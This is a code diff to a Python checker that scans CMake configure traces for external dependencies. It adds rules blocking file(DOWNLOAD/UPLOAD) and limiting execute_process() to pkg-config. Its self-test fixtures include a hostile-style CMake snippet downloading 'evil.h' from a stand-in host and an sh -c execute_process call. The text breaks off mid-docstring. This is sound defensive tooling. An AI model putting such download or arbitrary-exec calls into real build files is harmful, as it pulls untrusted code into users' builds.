@@ -253,6 +253,7 @@ import shutil
 import subprocess
 import sys
 import tempfile
+import time
 
 SCRIPT_NAME = "check_dep_zero_trace.py"
 
@@ -357,7 +358,55 @@ PKG_CHECK_MODULES_ALLOWLIST = frozenset({"wayland-client"})
 # comment - never widen this ahead of the measurement.
 CODEMODEL_LINK_LIBRARIES_ALLOWLIST = frozenset({"wayland-client", "m"})
 
+# R7 (REVIEW3-DEPZERO-TRACE.md CRITICO #1): file(DOWNLOAD ...) and
+# file(UPLOAD ...) are CMake's own NATIVE network transfer commands -
+# no FetchContent/ExternalProject/CPM/find_package/pkg_check_modules
+# involved at all, so R1..R6 (which only look at DEPENDENCY-MANAGER
+# vocabulary) never saw them. Blocked UNCONDITIONALLY, not via an
+# allowlist: the reviewer measured, live, that the real tree has
+# exactly TWO file() calls in total, neither one DOWNLOAD or UPLOAD
+# (confirmed independently while writing this fix: `git grep -n
+# "file("` finds file(MAKE_DIRECTORY ...) in cmake/
+# GlintfxWaylandProtocols.cmake and file(GENERATE ...) in cmake/
+# GlintfxPkgConfigValidate.cmake - neither is network-capable). A
+# command with zero legitimate uses today and a real, reproduced
+# network vector needs no allowlist to grow later; the leader's own
+# decision (relayed via the orchestrator) was explicit: "bloqueio
+# incondicional e seguro". Independently re-confirmed while writing
+# this fix (`git grep -nE '(^|[^a-zA-Z_])file\(' -- '*.cmake'
+# '*.txt'`, word-boundary so it does not also match configure_file()):
+# exactly two real file() calls in the whole tree, file(MAKE_DIRECTORY
+# ...) (cmake/GlintfxWaylandProtocols.cmake) and file(SHA256 ...)
+# (src/render/CMakeLists.txt) - neither DOWNLOAD nor UPLOAD, matching
+# the reviewer's own count exactly. Scoped to DOWNLOAD/UPLOAD only -
+# NOT ARCHIVE_EXTRACT/COPY, which operate on a file ALREADY on disk
+# and were not part of what was measured or asked; widening this set
+# is a future decision, not one this fix makes unilaterally.
+FILE_SUBCOMMANDS_FORBIDDEN = frozenset({"download", "upload"})
+
+# R8 (REVIEW3-DEPZERO-TRACE.md CRITICO #2): execute_process(COMMAND
+# ...) runs ANY external program with the full authority of the
+# configure process - curl, wget, git clone, an interpreter fed a
+# script on stdin, anything. R1..R6 never looked at it either. Unlike
+# file(DOWNLOAD)/file(UPLOAD), this one has exactly ONE real,
+# necessary use in the tree TODAY (cmake/GlintfxWaylandProtocols.cmake,
+# glintfx_locate_xdg_shell_protocol_xml(): `execute_process(COMMAND
+# "${PKG_CONFIG_EXECUTABLE}" --variable=pkgdatadir wayland-protocols
+# ...)`, resolving where the SYSTEM's wayland-protocols package keeps
+# xdg-shell.xml - GODS_LAWS.md L-05's own Wayland-without-vendoring
+# design depends on this call existing), so an unconditional block
+# would false-positive on the very first real run (the exact "portao
+# que barra o certo e desligado" failure the leader named). Judged by
+# the PROGRAM actually executed (the trace's own args are already
+# expanded, so "${PKG_CONFIG_EXECUTABLE}" resolves to the real,
+# absolute path CMake found), matched by basename with any Windows
+# ".exe"/".bat"/".cmd" suffix stripped and casefolded - the same
+# cross-platform-name reasoning R3's witness already uses for CMake
+# module basenames, applied here to an executable name instead.
+EXECUTE_PROCESS_PROGRAM_ALLOWLIST = frozenset({"pkg-config", "pkgconf"})
+
 _VERSION_COMPARATOR_RE = re.compile(r"^([^<>=!]+)")
+_EXECUTABLE_SUFFIX_RE = re.compile(r"\.(exe|bat|cmd)$", re.IGNORECASE)
 
 
 # --- small, single-purpose helpers ---------------------------------------
@@ -396,6 +445,25 @@ def event_file_basename(event):
 
 
 def is_under_root(candidate_path, root_path):
+    # REVIEW3-DEPZERO-TRACE.md CRITICO #4: os.path.realpath("") resolves
+    # to the process's own CURRENT WORKING DIRECTORY, not to an invalid
+    # sentinel - confirmed live by the reviewer, and reproduced here:
+    # `os.path.realpath("")` on this machine, run from inside the repo,
+    # returns the repo root itself. Every caller of this function passes
+    # a trace event's own "file" field (or a path built from it), and a
+    # malformed/truncated trace event missing that field used to reach
+    # here as event.get("file", "") == "" - which this function then
+    # silently and WRONGLY judged as "under the root", because the empty
+    # string resolved to cwd, and ctest/this script both normally run
+    # with cwd INSIDE source_root. Fail closed instead: an empty or
+    # non-absolute candidate is NEVER "under root", full stop, before
+    # realpath() ever gets a chance to reinterpret it as something else.
+    # A well-formed trace event's "file" is always an absolute path (the
+    # json-v1 trace format's own guarantee); anything else reaching this
+    # function is malformed input, and malformed input does not get the
+    # benefit of the doubt.
+    if not candidate_path or not os.path.isabs(candidate_path):
+        return False
     real_candidate = os.path.realpath(candidate_path)
     real_root = os.path.realpath(root_path)
     return real_candidate == real_root or real_candidate.startswith(
@@ -422,6 +490,44 @@ def prepare_codemodel_query(build_dir):
         open(query_file, "a", encoding="utf-8").close()
 
 
+def clear_stale_codemodel_reply_pointers(build_dir):
+    """Deletes any existing index-*.json/error-*.json in reply/.
+
+    REVIEW3-DEPZERO-TRACE.md CRITICO #4, second half: read_codemodel_
+    reply() below picks "the newest index-*.json/error-*.json by
+    mtime" - which, before this fix, had NO tie to the specific
+    reconfigure that produced the trace being judged. If THIS
+    reconfigure crashes, hangs, or is killed (OOM, disk full - the
+    exact near-miss this file's own header already records happening
+    to the orchestrator once) AFTER CMake starts writing trace lines
+    but BEFORE the file API gets to regenerate its reply, an OLD reply
+    from a PREVIOUS, successful configure of the SAME build_dir just
+    sits there and gets picked up as if it were fresh - reproduced live
+    by the reviewer against the real glintfx build/: a synthetic
+    5-line truncated trace plus a stale reply's real 61 targets add up
+    to "0 violation(s)" with full confidence, describing a configure
+    that never actually finished.
+    Deleting the pointer files (never the content-addressed target-
+    *.json/codemodel-v2-*.json siblings, which are safe and CORRECT to
+    reuse when their content has not changed) makes the fix
+    unconditional and cheap: after this reconfigure, EITHER a fresh
+    index-*.json/error-*.json exists (this run genuinely reached the
+    point of writing one), OR reply/ has none at all - and
+    read_codemodel_reply()'s existing "no index-*.json or error-*.json
+    in reply/" floor failure already covers that second case correctly.
+    No mtime comparison can achieve the same guarantee: mtime only
+    orders what is ALREADY there, it cannot distinguish "this run wrote
+    nothing" from "an old run's file happens to be the newest one
+    present" the way deleting first, unconditionally, does.
+    """
+    reply_dir = os.path.join(build_dir, ".cmake", "api", "v1", "reply")
+    if not os.path.isdir(reply_dir):
+        return
+    for name in os.listdir(reply_dir):
+        if name.startswith("index-") or name.startswith("error-"):
+            os.remove(os.path.join(reply_dir, name))
+
+
 def run_configure_with_trace(source_root, build_dir, trace_path):
     """Re-configures build_dir, writing the json-v1 trace to trace_path.
 
@@ -431,6 +537,7 @@ def run_configure_with_trace(source_root, build_dir, trace_path):
     codemodel reply exist; the floor checks decide usability.
     """
     prepare_codemodel_query(build_dir)
+    clear_stale_codemodel_reply_pointers(build_dir)
     command = [
         "cmake",
         "-S",
@@ -455,15 +562,38 @@ def read_trace_lines(trace_path):
 
 
 def parse_trace_events(lines):
-    """Returns (events, unparsed_count). See floor check (i)."""
+    """Returns (events, invalid_count). See floor check (i).
+
+    An event line can be unusable two ways: it may not be valid JSON
+    at all (json.loads raises), or it may be valid JSON that is
+    missing "file" or "cmd" (REVIEW3-DEPZERO-TRACE.md CRITICO #4: a
+    trace TRUNCATED mid-configure can still contain well-formed-but-
+    INCOMPLETE JSON objects on the lines it did manage to flush - a
+    real, reproduced-live shape, not a hypothetical one. Before this
+    fix, such an event's missing "file" silently became "" via
+    event.get("file", ""), and is_under_root("", source_root) returned
+    True by accident (os.path.realpath("") resolves to the process's
+    own cwd, which is normally INSIDE source_root) - so a truncated
+    trace could pass FLOOR(repo-scan) by counting events that prove
+    NOTHING about where they came from. Both failure shapes are
+    counted the SAME way here, as "this parser could not use this
+    line" - exactly what FLOOR(parity) exists to catch: a parser that
+    quietly drops or misreads lines must never look identical to one
+    that read every line correctly.
+    """
     events = []
-    unparsed = 0
+    invalid = 0
     for raw_line in lines[1:]:  # lines[0] is the {"version": ...} header
         try:
-            events.append(json.loads(raw_line))
+            event = json.loads(raw_line)
         except json.JSONDecodeError:
-            unparsed += 1
-    return events, unparsed
+            invalid += 1
+            continue
+        if not isinstance(event, dict) or not event.get("file") or not event.get("cmd"):
+            invalid += 1
+            continue
+        events.append(event)
+    return events, invalid
 
 
 def read_codemodel_reply(build_dir):
@@ -699,6 +829,103 @@ def evaluate_r5_add_subdirectory(events, source_root):
     return violations
 
 
+# --- R7: file(DOWNLOAD|UPLOAD) - CMake's own native network transfer -----
+
+
+def evaluate_r7_file_network(events):
+    violations = []
+    for event in events:
+        if event.get("cmd", "").lower() != "file":
+            continue
+        args = event.get("args", [])
+        if not args:
+            continue
+        subcommand = args[0].lower()
+        if subcommand in FILE_SUBCOMMANDS_FORBIDDEN:
+            violations.append(
+                Violation(
+                    "R7",
+                    event.get("file", "?"),
+                    event.get("line", "?"),
+                    f"file({args[0]} ...) is CMake's own native network"
+                    " transfer command, forbidden unconditionally"
+                    " (GODS_LAWS.md L-07)",
+                )
+            )
+    return violations
+
+
+# --- R8: execute_process(COMMAND ...), judged by the program it runs -----
+
+
+def _execute_process_programs(args):
+    """Every program named after a "COMMAND" keyword in an
+    execute_process() event's own args - there can be more than one
+    (a piped chain: COMMAND a ... COMMAND b ...), and this returns all
+    of them, in order.
+
+    Skips EMPTY-STRING tokens immediately after "COMMAND", instead of
+    treating the empty string itself as "the program". Measured live
+    (29/08/2026, while re-verifying this fix against the real tree):
+    CMake's OWN FindPython/Support.cmake (loaded by a plain find_
+    package(Python3 ...), no indirection needed to trigger it) traces
+    execute_process(COMMAND "" "/usr/bin/python3.14" -c ...) - an empty
+    launcher-prefix slot BEFORE the real program, the exact shape
+    CMAKE_CROSSCOMPILING_EMULATOR expands to when the variable is
+    unset (which it is, on a normal, non-cross-compiling build). This
+    is CMake's own internal convention, not an attack: treating the
+    empty slot as "a program named ''" produced a real false positive
+    against a completely ordinary find_package(Python3) - flagged the
+    same day it was written, before ever reaching a reviewer, by
+    re-running this fix's own verification against the real tree.
+    """
+    programs = []
+    index = 0
+    while index < len(args):
+        if args[index] == "COMMAND":
+            probe = index + 1
+            while probe < len(args) and args[probe] == "":
+                probe += 1
+            if probe < len(args) and args[probe] != "COMMAND":
+                programs.append(args[probe])
+        index += 1
+    return programs
+
+
+def _program_basename_casefold(program_path):
+    stem = os.path.basename(program_path)
+    stem = _EXECUTABLE_SUFFIX_RE.sub("", stem)
+    return stem.casefold()
+
+
+def evaluate_r8_execute_process(events):
+    violations = []
+    for event in events:
+        if event.get("cmd", "").lower() != "execute_process":
+            continue
+        args = event.get("args", [])
+        programs = _execute_process_programs(args)
+        if not programs:
+            # execute_process() with no "COMMAND" keyword at all is not
+            # valid CMake (the command REQUIRES at least one COMMAND
+            # clause) - nothing to judge, and CMake's own configure
+            # will already have refused the call before this trace
+            # event could even represent a running program.
+            continue
+        for program in programs:
+            if _program_basename_casefold(program) not in EXECUTE_PROCESS_PROGRAM_ALLOWLIST:
+                violations.append(
+                    Violation(
+                        "R8",
+                        event.get("file", "?"),
+                        event.get("line", "?"),
+                        "execute_process() runs a program outside the"
+                        f" allowlist: {program!r} (GODS_LAWS.md L-07)",
+                    )
+                )
+    return violations
+
+
 # --- R6: the codemodel, as a witness ---------------------------------------
 
 
@@ -761,14 +988,16 @@ def evaluate_r6_codemodel(codemodel, reply_dir, source_root):
 # --- the four floor checks (GODS_LAWS.md L-40) ------------------------------
 
 
-def check_floor_parity(trace_lines, events, unparsed_count):
+def check_floor_parity(trace_lines, events, invalid_count):
     expected = max(len(trace_lines) - 1, 0)  # minus the {"version": ...} header
     parsed = len(events)
-    if unparsed_count > 0 or parsed != expected - unparsed_count:
+    if invalid_count > 0 or parsed != expected - invalid_count:
         return (
             False,
-            f"FLOOR(parity): parser lost {unparsed_count} line(s) out of"
-            f" {expected} trace line(s) - a parser that loses lines"
+            f"FLOOR(parity): parser could not use {invalid_count} line(s)"
+            f" out of {expected} trace line(s) (not valid JSON, or valid"
+            ' JSON missing "file"/"cmd" - REVIEW3-DEPZERO-TRACE.md'
+            " CRITICO #4) - a parser that loses or misreads lines"
             " silently is the exact defect GODS_LAWS.md L-40 forbids",
         )
     return True, f"FLOOR(parity): {parsed}/{expected} trace line(s) parsed"
@@ -791,13 +1020,35 @@ def check_floor_nonempty_repo_scan(events, source_root):
     )
 
 
+def same_path_platform_aware(path_a, path_b):
+    """True if two ALREADY-RESOLVED paths name the same file, tolerant
+    of case on a case-insensitive-but-case-PRESERVING filesystem
+    (Windows/NTFS).
+
+    REVIEW3-DEPZERO-TRACE.md, item 8 ("IMPORTANTE... nao confirmado nem
+    refutado"): the reviewer could not run this on a real Windows
+    machine, and neither can this comment - the finding is declared as
+    a hypothesis there, and stays one here: os.path.normcase() is
+    Python's OWN documented, platform-aware answer to "normalize a
+    path for comparison" (a no-op on POSIX, case-folding plus
+    separator normalization on Windows) - the exact tool the standard
+    library ships for this exact problem, not a bespoke workaround.
+    Extracted as its own function so it is unit-testable on ANY
+    platform without needing two real filesystem entries that differ
+    only by case (which POSIX, being case-sensitive, cannot even
+    create as "the same file" to test against) - see this file's own
+    --selftest for what IS and is NOT provable from Linux.
+    """
+    return os.path.normcase(path_a) == os.path.normcase(path_b)
+
+
 def check_floor_sentinel(events, source_root, require_pkgconfig_sentinel):
     root_cmakelists = os.path.realpath(
         os.path.join(source_root, "CMakeLists.txt")
     )
     project_seen = any(
         e.get("cmd", "").lower() == "project"
-        and os.path.realpath(e.get("file", "")) == root_cmakelists
+        and same_path_platform_aware(os.path.realpath(e.get("file", "")), root_cmakelists)
         for e in events
     )
     if not project_seen:
@@ -855,9 +1106,9 @@ def judge(source_root, build_dir, trace_path, require_pkgconfig_sentinel):
     report = Report()
 
     trace_lines = read_trace_lines(trace_path)
-    events, unparsed_count = parse_trace_events(trace_lines)
+    events, invalid_count = parse_trace_events(trace_lines)
 
-    parity_ok, parity_line = check_floor_parity(trace_lines, events, unparsed_count)
+    parity_ok, parity_line = check_floor_parity(trace_lines, events, invalid_count)
     report.floor_lines.append(parity_line)
     report.floor_ok = report.floor_ok and parity_ok
 
@@ -889,6 +1140,8 @@ def judge(source_root, build_dir, trace_path, require_pkgconfig_sentinel):
         report.violations.extend(evaluate_r3_find_package(events, source_root))
         report.violations.extend(evaluate_r4_pkg_check_modules(events))
         report.violations.extend(evaluate_r5_add_subdirectory(events, source_root))
+        report.violations.extend(evaluate_r7_file_network(events))
+        report.violations.extend(evaluate_r8_execute_process(events))
 
     if codemodel_ok:
         reply_dir = os.path.join(build_dir, ".cmake", "api", "v1", "reply")
@@ -902,6 +1155,67 @@ def judge(source_root, build_dir, trace_path, require_pkgconfig_sentinel):
 
 
 # --- real mode --------------------------------------------------------------
+
+
+def scope_declaration():
+    """What "0 violation(s)" does and does NOT promise.
+
+    REVIEW3-DEPZERO-TRACE.md CRITICO #3: the PREVIOUS wording of this
+    declaration ("untaken branches are covered... by the shallow net")
+    was TRUE for R1..R6's own vocabulary (FetchContent/ExternalProject/
+    CPM/find_package/pkg_check_modules/add_subdirectory - confirmed
+    live by the reviewer: the shallow net catches a FetchContent call
+    behind an option()-guarded, default-OFF if(), because it reads the
+    file as literal text and does not care whether the branch is
+    taken) but SILENTLY FALSE for file(DOWNLOAD|UPLOAD)/
+    execute_process(), which the shallow net (check_dep_zero.sh) has
+    NEVER watched, in ANY configuration, taken branch or not (also
+    confirmed live by the reviewer: attackH/attackH2). R7/R8 close the
+    trace side of that gap for the TAKEN-branch case; the untaken-
+    branch case for those two commands specifically remains a REAL,
+    UNCOVERED gap by BOTH oracles today - this string says so, instead
+    of repeating a promise that turned out to be only half true.
+    """
+    return (
+        "this oracle judges the executed configuration. Untaken"
+        " branches naming FetchContent/ExternalProject/CPM/"
+        "find_package/pkg_check_modules/add_subdirectory are covered"
+        " as literal text by the shallow net regardless of the branch"
+        " being taken, and per-platform by the CI matrix. Untaken"
+        " branches naming file(DOWNLOAD|UPLOAD) or execute_process()"
+        " are NOT covered by either oracle today (DEPZERO-SHALLOW"
+        " needs to teach the shallow net those two forms) -"
+        " REVIEW3-DEPZERO-TRACE.md CRITICO #3"
+    )
+
+
+def trust_boundary_declaration():
+    """REVIEW3-DEPZERO-TRACE.md item 4 (IMPORTANTE): this script RUNS
+    the CMake configure of whatever <source-root>/<build-dir> it is
+    given, with the full process authority that implies - R7/R8 exist
+    precisely because a CMake configure can execute an arbitrary
+    program or download from an arbitrary URL. There is no identity
+    check on source_root (project name, GODS_LAWS.md presence, git
+    remote, expected commit) - low risk TODAY because the only real
+    caller (tests/CMakeLists.txt's dep_zero_trace/dep_zero_trace_
+    selftest) passes fixed argv, never argv controlled by a third
+    party, but that is a property of THIS project's own CI wiring, not
+    of this script, and the reviewer's own reproduction
+    (/var/tmp/depzero-review3/foreign-tree) confirms a foreign,
+    unrelated CMake project is judged with no complaint about
+    identity. This declaration exists so nobody copies this script
+    into a context where argv IS attacker-influenced without reading
+    this paragraph first.
+    """
+    return (
+        "this script RUNS the CMake configure of the tree it is"
+        " pointed at (that is how it observes what CMake executes) -"
+        " it must never be invoked with a source-root/build-dir pair"
+        " that did not come from a trusted, fixed call site"
+        " (tests/CMakeLists.txt's own dep_zero_trace registration is"
+        " the only trusted caller today; there is no identity check"
+        " in this script itself)"
+    )
 
 
 def platform_requires_pkgconfig_sentinel():
@@ -940,6 +1254,11 @@ def real_main(argv):
         print(f"{SCRIPT_NAME}: {line}")
     for note in report.notes:
         print(f"{SCRIPT_NAME}: {note}")
+    # Printed on BOTH verdicts (GODS_LAWS.md L-40, same reasoning as the
+    # floor lines above: a declaration read only on the green path is a
+    # declaration nobody reads on the day it would matter most).
+    print(f"{SCRIPT_NAME}: {scope_declaration()}")
+    print(f"{SCRIPT_NAME}: {trust_boundary_declaration()}")
 
     if report.violations or not report.floor_ok:
         print(
@@ -957,12 +1276,7 @@ def real_main(argv):
             print(configure_result.stderr, file=sys.stderr)
         sys.exit(1)
 
-    print(
-        f"{SCRIPT_NAME}: 0 violation(s) - this oracle judges the executed"
-        " configuration; untaken branches are covered only as literal text"
-        " by the shallow net (tools/git-hooks/pre-commit), and per-platform"
-        " by the CI matrix"
-    )
+    print(f"{SCRIPT_NAME}: 0 violation(s)")
 
 
 # --- --selftest: fixtures and controls --------------------------------------
@@ -1153,6 +1467,162 @@ add_subdirectory({outside} outsider-build)
     )
 
 
+def selftest_hostile_file_download(scratch):
+    """REVIEW3-DEPZERO-TRACE.md CRITICO #1: file(DOWNLOAD ...), a
+    native CMake command, no manager vocabulary involved at all.
+    """
+    root = os.path.join(scratch, "hostile_file_download")
+    write_fixture(
+        root,
+        """cmake_minimum_required(VERSION 3.25)
+project(hostile_file_download NONE)
+file(DOWNLOAD
+    "https://example.invalid/evil.h"
+    "${CMAKE_BINARY_DIR}/evil.h"
+    STATUS dl_status
+)
+""",
+    )
+    build_dir = os.path.join(root, "build")
+    os.makedirs(build_dir, exist_ok=True)
+    subprocess.run(["cmake", "-S", root, "-B", build_dir], capture_output=True)
+    report = configure_and_judge(root, build_dir)
+    ok = any(v.rule == "R7" and "DOWNLOAD" in v.message for v in report.violations)
+    return selftest_report(
+        "hostile: file(DOWNLOAD ...) - native network transfer, no"
+        " dependency-manager vocabulary at all",
+        ok,
+        detail=f"violations={[v.format() for v in report.violations]}",
+    )
+
+
+def selftest_hostile_execute_process_disallowed_program(scratch):
+    """REVIEW3-DEPZERO-TRACE.md CRITICO #2: execute_process() can run
+    ANY program - here, a stand-in for "curl a tarball and extract it"
+    (the reviewer's own example, kept inert: this just writes a local
+    file, no real network access from a --selftest fixture).
+    """
+    root = os.path.join(scratch, "hostile_execute_process")
+    write_fixture(
+        root,
+        """cmake_minimum_required(VERSION 3.25)
+project(hostile_execute_process NONE)
+execute_process(
+    COMMAND sh -c "echo 'int vendored_evil(void){return 1;}' > ${CMAKE_BINARY_DIR}/vendored_evil.c"
+    RESULT_VARIABLE dl_rc
+)
+""",
+    )
+    build_dir = os.path.join(root, "build")
+    os.makedirs(build_dir, exist_ok=True)
+    subprocess.run(["cmake", "-S", root, "-B", build_dir], capture_output=True)
+    report = configure_and_judge(root, build_dir)
+    ok = any(v.rule == "R8" and "'sh'" in v.message for v in report.violations)
+    return selftest_report(
+        "hostile: execute_process(COMMAND sh ...) - a program outside"
+        " the allowlist",
+        ok,
+        detail=f"violations={[v.format() for v in report.violations]}",
+    )
+
+
+def selftest_positive_execute_process_pkgconfig(scratch):
+    """The ONE real, necessary execute_process() use in this project
+    (cmake/GlintfxWaylandProtocols.cmake's own glintfx_locate_xdg_
+    shell_protocol_xml()) MUST keep passing - R8 exists to judge the
+    program, not to blanket-ban the command CMake's own FindPkgConfig.
+    cmake module (loaded here via find_package(PkgConfig REQUIRED),
+    exactly like the real tree does) ALSO uses internally for its own
+    `pkg-config --version` probe - this fixture exercises BOTH calls,
+    proving neither one false-positives.
+    """
+    root = os.path.join(scratch, "positive_execute_process_pkgconfig")
+    write_fixture(
+        root,
+        """cmake_minimum_required(VERSION 3.25)
+project(positive_execute_process_pkgconfig NONE)
+find_package(PkgConfig REQUIRED)
+execute_process(
+    COMMAND "${PKG_CONFIG_EXECUTABLE}" --variable=pkgdatadir wayland-protocols
+    OUTPUT_VARIABLE dummy_out
+    OUTPUT_STRIP_TRAILING_WHITESPACE
+    RESULT_VARIABLE dummy_result
+)
+add_custom_target(dummy)
+""",
+    )
+    build_dir = os.path.join(root, "build")
+    os.makedirs(build_dir, exist_ok=True)
+    subprocess.run(["cmake", "-S", root, "-B", build_dir], capture_output=True)
+    report = configure_and_judge(root, build_dir)
+    r8_violations = [v for v in report.violations if v.rule == "R8"]
+    ok = not r8_violations
+    return selftest_report(
+        "positive: execute_process(COMMAND pkg-config ...) - the ONE"
+        " real use in this project, plus CMake's OWN internal"
+        " FindPkgConfig.cmake probe - neither false-positives",
+        ok,
+        detail=f"R8 violations={[v.format() for v in r8_violations]}",
+    )
+
+
+def selftest_execute_process_empty_launcher_slot_not_misidentified(scratch):
+    """execute_process()'s EMPTY launcher-prefix slot (CMake's own
+    CMAKE_CROSSCOMPILING_EMULATOR-style convention) must never itself
+    be reported as "the program". Not a hypothetical: measured live,
+    29/08/2026, re-verifying THIS fatia's own R8 against the real
+    tree - a plain find_package(Python3 COMPONENTS Interpreter
+    REQUIRED), no indirection, made CMake's own FindPython/
+    Support.cmake trace execute_process(COMMAND "" "/usr/bin/
+    python3.14" -c ...) nine separate times, and R8's first version
+    (args[index+1] straight after "COMMAND", no empty-slot skip)
+    reported all nine as "program outside the allowlist: ''".
+
+    Deliberately NOT asserting "zero R8 violations" here: python3.14
+    itself is genuinely NOT in EXECUTE_PROCESS_PROGRAM_ALLOWLIST (this
+    project's real CMakeLists.txt never calls find_package(Python3) -
+    it resolves the interpreter via find_program() instead, precisely
+    to avoid this module's OWN surface entirely - see tests/
+    CMakeLists.txt's own comment on that switch), so R8 correctly,
+    CORRECTLY still flags the REAL resolved program once the empty
+    slot is skipped - that is R8 working as designed, not a bug to
+    hide. The ONLY claim this control makes is narrower and precise:
+    no violation ever names the EMPTY STRING as the offending program.
+    """
+    root = os.path.join(scratch, "execute_process_empty_launcher_slot")
+    write_fixture(
+        root,
+        """cmake_minimum_required(VERSION 3.25)
+project(execute_process_empty_launcher_slot NONE)
+find_package(Python3 COMPONENTS Interpreter REQUIRED)
+add_custom_target(dummy)
+""",
+    )
+    build_dir = os.path.join(root, "build")
+    os.makedirs(build_dir, exist_ok=True)
+    subprocess.run(["cmake", "-S", root, "-B", build_dir], capture_output=True)
+    report = configure_and_judge(root, build_dir)
+    r8_violations = [v for v in report.violations if v.rule == "R8"]
+    empty_program_violations = [v for v in r8_violations if "''" in v.message]
+    real_program_violations = [v for v in r8_violations if "python3" in v.message.lower()]
+    # Positive AND negative in one control: the empty slot must be
+    # invisible (empty_program_violations == []), and the REAL program
+    # this fixture actually runs must still be visible
+    # (real_program_violations != []) - a control that only checked
+    # "no empty-string violation" could pass just as well if R8 had
+    # gone blind entirely, which would be a very different, much worse
+    # bug hiding behind an apparently-green result.
+    ok = not empty_program_violations and bool(real_program_violations)
+    return selftest_report(
+        "execute_process(): an empty launcher-prefix slot before the"
+        " real program (CMake's own FindPython/Support.cmake shape) is"
+        " never itself reported as the violating program - the REAL"
+        " program (not allowlisted here on purpose) still is",
+        ok,
+        detail=f"R8 violations={[v.format() for v in r8_violations]}",
+    )
+
+
 # Two positive controls (ORDEM DE SERVICO: "tao obrigatorios quanto" -
 # a gate that blocks the legitimate is disabled within a week).
 
@@ -1269,33 +1739,371 @@ def selftest_floor_corrupted_line_reproves_by_parity(scratch):
         shutil.rmtree(real_scratch, ignore_errors=True)
 
 
+def selftest_is_under_root_rejects_empty_and_relative(scratch):
+    """REVIEW3-DEPZERO-TRACE.md CRITICO #4, the root cause in its
+    purest, most direct form - the reviewer's OWN reproduction was a
+    single interpreter line: `os.path.realpath("")` resolves to the
+    process's own CURRENT WORKING DIRECTORY, not an invalid sentinel.
+    selftest_floor_events_without_file_do_not_inflate_scan (above) is
+    the end-to-end proof through judge(), but it runs from fixtures
+    under a scratch dir that does NOT coincide with this process's own
+    cwd - the exact "normal situation" that makes the bug dangerous
+    (ctest/this script both typically run with cwd INSIDE source_root)
+    is not naturally exercised there. This control tests is_under_
+    root() directly, using THIS PROCESS'S OWN cwd as the root - the
+    precise condition the reviewer measured - so there is no ambiguity
+    about whether the fix's root cause, not just a downstream symptom
+    of it, is what is being proven.
+    """
+    cwd = os.getcwd()
+    empty_rejected = is_under_root("", cwd) is False
+    relative_rejected = is_under_root("some/relative/path", cwd) is False
+    # Positive control alongside the two negatives (GODS_LAWS.md L-40:
+    # a check that only ever returns False could be trivially "correct"
+    # by being broken in the OTHER direction) - a real absolute path
+    # genuinely under cwd must still be accepted.
+    real_child = os.path.join(cwd, "some_real_child_of_cwd")
+    positive_accepted = is_under_root(real_child, cwd) is True
+    ok = empty_rejected and relative_rejected and positive_accepted
+    return selftest_report(
+        "is_under_root(): empty string and relative paths are NEVER"
+        ' "under root" (os.path.realpath("") resolving to this'
+        " process's own cwd is exactly the reviewer's own reproduction),"
+        " while a real absolute child path still is",
+        ok,
+        detail=f"cwd={cwd!r} empty_rejected={empty_rejected}"
+        f" relative_rejected={relative_rejected}"
+        f" positive_accepted={positive_accepted}",
+    )
+
+
+def selftest_floor_events_without_file_do_not_inflate_scan(scratch):
+    """REVIEW3-DEPZERO-TRACE.md CRITICO #4, first half: a trace event
+    that IS valid JSON but is missing "file" (the exact shape a
+    mid-configure truncation can produce - CMake flushes each line as
+    it goes, so a kill mid-statement can leave a syntactically-valid-
+    but-semantically-incomplete object on disk) used to be silently
+    counted as "under the repository" by is_under_root("", root), which
+    resolves the empty string to the process's own cwd via os.path.
+    realpath("") - reproduced live by the reviewer against the REAL
+    glintfx build/. This control builds that exact shape by hand (3
+    "file"-less events glued onto 2 real, well-formed ones) and proves
+    BOTH halves of the fix: the file-less events are excluded from
+    FLOOR(repo-scan)'s own count (2, not 5), AND they reprove the whole
+    judgement via FLOOR(parity) instead of passing silently.
+    """
+    root = os.path.join(scratch, "floor_no_file_field")
+    write_fixture(
+        root,
+        "cmake_minimum_required(VERSION 3.25)\n"
+        "project(floor_no_file_field NONE)\n"
+        "add_custom_target(dummy)\n",
+    )
+    build_dir = os.path.join(root, "build")
+    os.makedirs(build_dir, exist_ok=True)
+    subprocess.run(["cmake", "-S", root, "-B", build_dir], capture_output=True)
+
+    root_cmakelists = os.path.realpath(os.path.join(root, "CMakeLists.txt"))
+    synthetic_lines = [
+        json.dumps({"version": {"major": 1, "minor": 2}}),
+        json.dumps({
+            "cmd": "cmake_minimum_required",
+            "file": root_cmakelists,
+            "line": 1,
+            "args": ["VERSION", "3.25"],
+        }),
+        json.dumps({
+            "cmd": "project",
+            "file": root_cmakelists,
+            "line": 2,
+            "args": ["floor_no_file_field", "NONE"],
+        }),
+    ]
+    for _ in range(3):
+        # The bug shape: valid JSON, no "file" at all - not "", ABSENT.
+        synthetic_lines.append(json.dumps({"cmd": "set", "args": ["x", "y"]}))
+
+    synthetic_scratch = make_scratch_workdir()
+    try:
+        synthetic_path = os.path.join(synthetic_scratch, "trace.json")
+        with open(synthetic_path, "w", encoding="utf-8") as handle:
+            handle.write("\n".join(synthetic_lines) + "\n")
+        report = judge(root, build_dir, synthetic_path, False)
+
+        parity_line = _floor_line_for(report, "parity")
+        scan_line = _floor_line_for(report, "repo-scan")
+        ok = (
+            not report.floor_ok
+            and parity_line is not None
+            and "could not use 3" in parity_line
+            and scan_line is not None
+            and "2 trace event(s)" in scan_line
+        )
+        return selftest_report(
+            "floor: trace events missing \"file\" are never counted as"
+            " repository events, and reprove via parity instead of"
+            " silently passing (REVIEW3-DEPZERO-TRACE.md CRITICO #4)",
+            ok,
+            detail=f"floor_lines={report.floor_lines}",
+        )
+    finally:
+        shutil.rmtree(synthetic_scratch, ignore_errors=True)
+
+
+def selftest_codemodel_reply_not_stale(scratch):
+    """REVIEW3-DEPZERO-TRACE.md CRITICO #4, second half.
+
+    Measured live while writing this control (NOT assumed): CMake's
+    OWN file-API generation already deletes a stale index-*.json by
+    ITSELF on a reconfigure that reaches "Generating done" - a plain
+    second `cmake -S -B`, with nothing wrong, silently makes this
+    exact bug look fixed whether or not clear_stale_codemodel_reply_
+    pointers() ever runs, because CMake's own success path already
+    cleans up. That is NOT the scenario the reviewer's finding is
+    about: the finding is what happens when a reconfigure does NOT
+    reach that point (crash/kill mid-configure - CMake never gets a
+    chance to clean up). A true process kill is not something this
+    control can time deterministically, but a CMakeLists.txt PARSE
+    ERROR reproduces the identical file-API shape WITHOUT any timing
+    race: measured live that CMake, on a pure parse failure (before
+    project() ever runs), writes a fresh error-*.json for the current
+    attempt but does NOT touch any PRE-EXISTING index-*.json/other
